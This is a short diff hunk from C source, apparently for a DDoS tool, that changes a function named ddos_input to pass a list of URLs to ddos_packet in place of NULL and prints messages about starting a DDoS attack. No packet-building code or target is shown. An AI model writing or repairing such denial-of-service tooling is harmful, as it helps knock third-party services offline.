@@ -57,7 +57,7 @@ void ddos_input(SOCKET sock) {
     }
 
     printf("Sending a packet at the beginning of a DDoS attack...\n");
-    if (ddos_packet(sock, NULL) < 0) {
+    if (ddos_packet(sock, urls) < 0) {
         printf("Failed to command ddos send packet\n");
     }
 }
